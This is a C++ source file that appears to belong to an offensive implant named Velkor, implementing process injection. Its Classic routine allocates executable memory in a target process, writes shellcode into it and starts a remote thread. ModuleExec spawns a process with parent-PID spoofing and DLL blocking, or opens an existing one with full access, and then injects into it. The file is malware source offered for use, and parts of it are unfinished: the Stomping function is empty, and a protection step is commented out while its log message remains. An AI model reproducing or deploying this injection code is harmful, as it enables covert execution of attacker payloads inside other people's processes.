#include <Ground.h>

namespace Injection {

    namespace Shellcode {

        D_SEC( B ) BOOL Classic( HANDLE ProcessHandle, PBYTE ShellcodeBuffer, PSIZE_T ShellcodeSize, PVOID Parameter, BOOL PostEx ) {
            VELKOR_INSTANCE

            BOOL    bSuccess      = FALSE;
            PVOID   BaseAddress   = NULL;
            PVOID   TmpValue      = NULL;
            ULONG   TotalSize     = 0;
            PULONG  OldProtection = 0;
            PSIZE_T BytesWritten  = 0;
            HANDLE  ThreadHandle  = NULL;

            if ( PostEx ) {
                TotalSize = ( C_DEF64( ShellcodeSize ) + sizeof( PEX_ARGS ) );
            } else {
                TotalSize = C_DEF64( ShellcodeSize );
            }

            BaseAddress = VkMem::Alloc( NULL, TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, ProcessHandle );
            if ( !BaseAddress ) goto _VK_END;

            VkShow( "{INJ} Memory allocated at 0x%p [%d bytes]\n", BaseAddress, TotalSize );

            if ( !ProcessHandle || ProcessHandle == NtCurrentProcess() ) {
                TmpValue  = VkMem::Copy( BaseAddress, ShellcodeBuffer, TotalSize );
                Parameter = VkMem::Copy( ( BaseAddress + C_DEF64( ShellcodeSize ) ), Parameter, sizeof( PEX_ARGS ) );
                if ( TmpValue ) goto _VK_END;
            } else {
                bSuccess = VkMem::Write( BaseAddress, ShellcodeBuffer, TotalSize, BytesWritten, ProcessHandle );
                if ( !bSuccess ) goto _VK_END;
            }

            VkShow( "{INJ} Memory written!\n" );

            // bSuccess = VkMem::Protect( BaseAddress, C_DEF64( ShellcodeSize ), PAGE_EXECUTE_READ, OldProtection, ProcessHandle );
            // if ( !bSuccess ) {
            //      ErrorHandler( NtLastError(), "Protection change" ); goto _VK_END;
            // }

            VkShow( "{INJ} Protection changed!\n" );

            ThreadHandle = VkThread::Create( 0, BaseAddress, Parameter, 0, 0, ProcessHandle );
            if ( !ThreadHandle || ThreadHandle == INVALID_HANDLE_VALUE ) goto _VK_END;

            VkShow( "{INJ} Thread created succefully\n" );

            C_DEF64( ShellcodeSize ) = PAGE_ALIGN( TotalSize );

        _VK_END:
            if ( !bSuccess && BaseAddress ) VkMem::Free( BaseAddress, TotalSize, ProcessHandle );
            return bSuccess;
        }

        D_SEC( B ) BOOL Stomping( HANDLE ProcessHandle, PBYTE ShellcodeBuffer, PSIZE_T ShellcodeSize, PVOID Parameter, BOOL PostEx ) {
            VELKOR_INSTANCE


        }

    }

    namespace Pe {

    }

    D_SEC( B ) BOOL ModuleExec( PBYTE ShellcodeBuffer, SIZE_T ShellcodeSize ) {
        VELKOR_INSTANCE

        BOOL                Success       = FALSE;
        HANDLE              ProcessHandle = NULL;
        PROCESS_INFORMATION ProcInfo      = { 0 };

        if ( PsCtx.Type == PsSpawn ) {
            Success = VkProcess::Create( 
                PsCtx.Spawn.ProcessName, TRUE, 0, PsCtx.Spawn.CurrentDir, 
                &ProcInfo, PsCtx.Spawn.ParentPid, PsCtx.Spawn.BlockDlls 
            );

            InjCtx.ScRun[VK_SC_INJ_T]( ProcInfo.hProcess, ShellcodeBuffer, &ShellcodeSize, InjCtx.Args.Fork.Argument, TRUE );
        } else if ( PsCtx.Type == PsTarget ) {
            ProcessHandle = VkProcess::Open( PROCESS_ALL_ACCESS, TRUE, PsCtx.Target.ProcessId );
            InjCtx.ScRun[VK_SC_INJ_T]( ProcessHandle, ShellcodeBuffer, &ShellcodeSize, InjCtx.Args.Fork.Argument, TRUE );
        }
    }

}